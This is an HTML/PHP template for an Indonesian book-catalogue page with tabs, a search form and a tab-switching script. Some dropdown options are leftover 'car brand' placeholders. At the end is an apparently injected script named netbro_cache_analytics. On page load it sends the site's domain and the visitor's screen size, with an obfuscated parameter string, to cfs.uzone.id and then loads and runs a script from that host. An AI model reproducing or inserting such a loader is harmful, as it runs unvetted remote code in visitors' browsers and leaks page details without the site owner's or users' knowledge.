
<style type="text/css">
.tab {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    border: 1px solid #ccc;
    background-color: #f1f1f1;
    float: left;
    width: 88%;
    margin-left: 6%;
    text-align: left;
}
.tab li{display: inline;}
.tab li a {
    display: inline-block;
    color: #444444;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
    transition: 0.3s;
    font-size: 17px;
}
.tab li a:hover {
    background-color: #ddd;
}
.tab li a:focus, .active {
    background-color: #ccc;
}

.tabcontent {
    display: none;
    padding: 25px 12px;
    border: 1px solid #ccc;
    border-top: none;
    width: 86%;
    float: left;
    margin-left: 6%;
}
.chip {
    display: inline-block;
    padding: 10px;
    margin: 10px 0 10px 0;
    height: 20px;
    font-size: 18px;
    line-height: 20px;
    border-radius: 25px;
    background-color: #f1f1f1;
}

.chip img {
    float: left;
    margin: 0 10px 0 -25px;
    height: 50px;
    width: 50px;
    border-radius: 50%;
}

.closebtn {
    padding-left: 10px;
    color: #888;
    font-weight: bold;
    float: right;
    font-size: 20px;
    cursor: pointer;
}

.closebtn:hover {
    color: #000;
}
input[type=submit]{margin: 10px 0 10px 0; padding: 10px; background: orange; color: #fff; border: 0; outline: 0; width: 200px; border: 1px solid orange; cursor: pointer; }
select{margin: 10px 0 10px 0 ; padding: 10px; width: 400px; margin-right: 10px; color: #ccc; }

</style>
<div class="bagan-banner">
<center>
<div class="tab">
  <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'car')">Aku Mau Buku</a></li>
   <li><a href="javascript:void(0)" class="tablinks" onclick="openCity(event, 'category')">Katalog Buku</a></li>
</div>
<div id="car" class="tabcontent">
  <form>
  		<select>
  			<option>Pilih Harga Buku</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  		</select>
  		<select>
  			<option>Pilih Kategori Buku</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  			<option>Pilih Brand Mobil</option>
  		</select>
  		<input type="submit" value="Cari Buku" name="" >
  </form>
</div>
<div id="category" class="tabcontent">
 <?php 
  $db->tampil_katalog_index();
  ?>
</div>

<script>
function openCity(evt, cityName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
     
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK0qZadE47JUdGHFHLfbVduxLeSZTaN%2fCvsyhiQsCTEtCGiaxtBhV5Mo6GA6xdw0AJrNFB8G2Df%2fKvwdy8%2b5RGE7WpzSx3nVPJZepAYRCPKtp%2bMqQ8l9q3SGImIqt4qpguMnxb%2bd%2f2zxV2j%2fcS%2bq9K7zM3p9pEeJfMPs2kDGypYtNiRFlawHoJvtn%2fQq0CXoXf1bCec%2f7skoZOjStT1qwTrB4b4xPG2AOpVhK1u01LQz2FunpFx2x5blSkmsCzQux07BIVc9QzUkyvOnTWciBi4FTtr8gwOegFbawaUbUFUIAo43j6PH3X6nC%2fnuuRw9nD1JBN4RRsWXD3d0a7JTrnpIyZNP9XOpV3InPV4E9BbglIpzZAVA%2f4dP6Z4nEO0ygQC2Po7sg1GQ%2fw9xDmH5iYgOyFEVK80oFK0k1vCsH%2b9VinlymBB1nIGAtweiNASO8i7FIf1RPz949TGTlpBNtlIbz%2fk9GMwd%2f3cRQk%2bev9E5ipJvQ73Q3OIi1QuKVN1UD%2b6f31Bnsowis25grxjyXeewp%2f9%2fc%2fJDEXGdTLjbZ3dtLQBgpC76rbcL0t10%2b0SfvI7Op7b7ZcW6M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</center>
	
</div>

